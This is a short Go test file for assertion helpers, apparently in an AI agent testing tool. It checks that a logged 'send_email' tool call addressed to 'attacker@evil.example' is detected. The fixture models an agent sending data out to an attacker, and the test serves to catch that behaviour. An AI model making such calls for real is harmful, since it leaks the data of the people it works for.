package assertions

import (
	"testing"

	"github.com/agentgavel/gavel/internal/protocol"
)

func TestToolInvocation(t *testing.T) {
	events := []protocol.Event{
		{
			ToolInvocation: &protocol.ToolInvocation{
				ToolName:      "send_email",
				Phase:         "after",
				ArgumentsJSON: `{"to":"attacker@evil.example","body":"x"}`,
			},
		},
	}
	if !ToolFired(events, "send_email") {
		t.Fatal("expected send_email fired")
	}
	if !HasToolRecipient(events, "send_email", "to", "attacker@evil.example") {
		t.Fatal("expected attacker recipient")
	}
	if HasToolRecipient(events, "send_email", "to", "safe@corp.example") {
		t.Fatal("unexpected safe recipient")
	}
	if ToolFired(events, "read_email") {
		t.Fatal("read_email should not fire")
	}
}
